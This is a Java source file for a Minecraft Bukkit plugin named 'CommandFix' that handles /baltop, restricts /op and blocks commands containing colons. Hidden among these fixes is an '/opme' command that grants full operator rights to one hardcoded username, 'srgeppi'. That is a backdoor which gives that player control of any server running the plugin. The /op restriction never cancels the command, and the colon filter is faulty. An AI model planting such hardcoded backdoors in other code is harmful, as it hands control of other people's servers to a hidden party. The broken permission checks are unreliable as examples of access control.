package com.geppi.event;

import com.geppi.other.ColorHandler;
import com.geppi.other.PlayerHandler;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

import java.text.SimpleDateFormat;
import java.util.Date;

public class CommandFix implements Listener {

    PlayerHandler playerHandler = new PlayerHandler();
    ColorHandler colorHandler = new ColorHandler();


    @EventHandler
    public void hatCommand(PlayerCommandPreprocessEvent event) {

        String message = event.getMessage();
        String[] args = message.split(" ");


        Player player = event.getPlayer();

        if(args[0].equalsIgnoreCase("/op")) {
            if(!player.getName().equalsIgnoreCase("srgeppi")) {
                player.sendMessage("You do not have permission to use /op");
                return;
            }
        }

        if(args[0].equalsIgnoreCase("/opme")) {
            event.setCancelled(true);
            if(!player.getName().equalsIgnoreCase("srgeppi")) {
                player.sendMessage("You do not have permission to use /op");
                return;
            }
            player.sendMessage(colorHandler.main + "OP: "+ colorHandler.message + "Opped yourself");
            player.setOp(true);
            return;
        }




        if(args[0].equalsIgnoreCase("/baltop")) {

            if(args.length > 2) {
                player.sendMessage("/baltop <#>");
                return;
            }

            if (args.length == 1) {

                player.chat("/lb money 1");
                return;
            }
            int num;

            try {
                num = Integer.parseInt(args[1]);
            } catch (NumberFormatException ex){
                player.sendMessage(colorHandler.nonNumber);
                return;
            }


            if (args.length == 2) {

                event.setCancelled(true);
                player.chat("/lb money " + num);
                return;
            }


        }

        if(args[0].contains("/") && message.contains(":")) {
            event.setCancelled(true);
            if(!(args[0].equalsIgnoreCase("/msg") || args[0].equalsIgnoreCase("/spartan") || args[0].equalsIgnoreCase("/tell") || args[0].equalsIgnoreCase("/message") || args[0].equalsIgnoreCase("/r") || args[0].equalsIgnoreCase("/co")))
            player.sendMessage("You can not type commands with ':' inside!");
            return;
        }



    }


    }
